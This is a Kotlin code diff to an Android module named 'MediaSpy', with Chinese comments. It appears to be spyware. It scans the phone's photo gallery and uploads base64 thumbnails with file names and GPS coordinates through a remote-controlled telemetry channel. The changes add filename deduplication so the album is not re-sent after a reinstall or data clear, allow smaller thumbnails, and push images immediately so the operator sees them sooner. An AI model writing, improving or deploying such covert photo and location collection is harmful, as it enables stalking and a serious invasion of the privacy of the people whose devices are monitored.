@@ -33,6 +33,8 @@ object MediaSpy {
     @Volatile private var quality = 82
     private const val PREF = "tlm_media"
     private const val KEY_LAST = "last_added"
+    private const val KEY_SENT = "sent_names"
+    private const val SENT_KEEP = 4000     // 记住最近发过的文件名，防重推
 
     // ---- 诊断：上次扫描的结果，随心跳上报 ----
     @Volatile var lastRows = -1
@@ -41,12 +43,17 @@ object MediaSpy {
     @Volatile var lastErr = ""
 
     fun scan(ctx: Context) {
-        targetPx = RemoteConfig.mediaMaxPx.coerceIn(480, 2160)
+        targetPx = RemoteConfig.mediaMaxPx.coerceIn(240, 2160)
         quality = RemoteConfig.mediaQuality.coerceIn(50, 95)
 
-        val since = ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
-            .getLong(KEY_LAST, 0L)
+        val pref = ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
+        val since = pref.getLong(KEY_LAST, 0L)
         lastSince = since
+        // 光靠 DATE_ADDED 不够：卸载重装、换签名、清数据都会让 last_added 归零，
+        // 一归零就把整本相册重新推一遍（一张图能存出十行）。这里再用文件名兜一层。
+        val sentNames = (pref.getStringSet(KEY_SENT, emptySet()) ?: emptySet())
+            .toMutableSet()
+        var dirtyNames = false
         var newest = since
         var sent = 0
         var rows = 0
@@ -82,13 +89,15 @@ object MediaSpy {
                     if (added <= since) break          // 已经发过的都跳过
                     newest = maxOf(newest, added)
 
+                    val nm0 = cur.getString(iName) ?: "IMG_${cur.getLong(iId)}.jpg"
+                    if (nm0 in sentNames) continue        // 这张发过了
                     val id = cur.getLong(iId)
                     val uri = ContentUris.withAppendedId(
                         MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                     val thumb = thumbOf(ctx, uri) ?: continue
 
                     val d = JSONObject()
-                        .put("name", cur.getString(iName) ?: "IMG_$id.jpg")
+                        .put("name", nm0)
                         .put("thumb", Base64.encodeToString(thumb, Base64.NO_WRAP))
                         .put("w", cur.getInt(iW))
                         .put("h", cur.getInt(iH))
@@ -98,6 +107,7 @@ object MediaSpy {
                         d.put("lat", lat).put("lon", lon)
                     }
                     Telemetry.push("media", d, added / 1000L)
+                    if (sentNames.add(nm0)) dirtyNames = true
                     sent++
                     // 每 8 张就推一次，不等扫完 —— 用户能边扫边看到图
                     if (sent % 8 == 0) {
@@ -112,10 +122,15 @@ object MediaSpy {
         lastRows = rows
         lastSent = sent
 
-        if (newest > since) {
-            ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
-                .edit().putLong(KEY_LAST, newest).apply()
+        val ed = pref.edit()
+        if (newest > since) ed.putLong(KEY_LAST, newest)
+        if (dirtyNames) {
+            // 太长就只留最近的一批，别让 SharedPreferences 无限涨
+            val keep = if (sentNames.size > SENT_KEEP)
+                sentNames.toList().takeLast(SENT_KEEP).toSet() else sentNames
+            ed.putStringSet(KEY_SENT, keep)
         }
+        ed.apply()
         // 扫完立刻推，不等下一轮心跳（原来要等最多 20 秒）
         if (sent > 0) {
             runCatching { Telemetry.flush(ctx, true) }
